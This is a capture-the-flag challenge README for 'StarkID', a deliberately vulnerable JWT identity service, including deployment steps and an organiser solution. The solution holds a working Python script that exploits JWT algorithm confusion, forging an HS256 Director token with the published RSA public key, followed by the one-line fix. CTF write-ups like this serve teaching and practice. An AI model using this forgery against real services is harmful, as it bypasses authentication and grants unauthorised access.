# StarkID — CTF Challenge

**Category:** Web Exploitation  
**Difficulty:** Hard  
**Points:** 500

---

## Story

Stark Industries has deployed **StarkID**, a next-generation identity platform
for S.H.I.E.L.D. field agents. Tokens are signed with Arc Reactor–grade RSA
cryptography. The JWKS endpoint publishes the public key for inter-agency
verification — because transparency builds trust, and the private key stays
locked in the vault anyway.

Only Director Fury holds Director-level clearance. Can you convince J.A.R.V.I.S.
that you are him?

**Flag:** `zerosecurectf{flag_goes_here}`

---

## Deployment (Organiser)

```bash
npm install
npm run gen-keys     # prints RSA_PRIVATE_KEY, RSA_PUBLIC_KEY, FLAG

# Vercel → Settings → Environment Variables — add all three values
vercel deploy --prod
```

---

## Solution (Organiser Only)

### Vulnerability
`jwt.verify(token, publicKey)` is called without `algorithms: ['RS256']`.
`jsonwebtoken` accepts whatever algorithm the token header declares, including
`HS256`. The RSA public key is published at the JWKS endpoint; an attacker
uses it as the HMAC-SHA256 secret to forge a Director-clearance token.

### Attack

```python
import requests, base64, jwt
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.backends import default_backend

BASE = "https://<your-domain>"

# 1. Get RSA public key from JWKS
jwks = requests.get(f"{BASE}/api/.well-known/jwks").json()
k    = jwks["keys"][0]

def b64url_to_int(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + "=="), "big")

pub = RSAPublicNumbers(b64url_to_int(k["e"]), b64url_to_int(k["n"])) \
        .public_key(default_backend())
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

# 2. Forge HS256 Director token using the public key as the HMAC secret
forged = jwt.encode(
    {
        "sub":       "fury",
        "clearance": "director",
        "iss":       "starkid.stark.tech",
        "aud":       "starkid.stark.tech",
    },
    pem,
    algorithm="HS256",
)

# 3. Claim the flag
r = requests.get(f"{BASE}/api/flag",
                 headers={"Authorization": f"Bearer {forged}"})
print(r.json())   # → {"flag": "zerosecurectf{flag_goes_here}", "message": "Welcome, Director."}
```

### Fix
```js
decoded = jwt.verify(token, publicKey, { algorithms: ["RS256"] });
```

---

## API Reference

| Endpoint | Method | Description |
|---|---|---|
| `/api/login` | POST | `{agentId, passphrase}` → StarkID JWT |
| `/api/.well-known/jwks` | GET | RSA public verification keys |
| `/api/flag` | GET | Director-clearance classified intel |
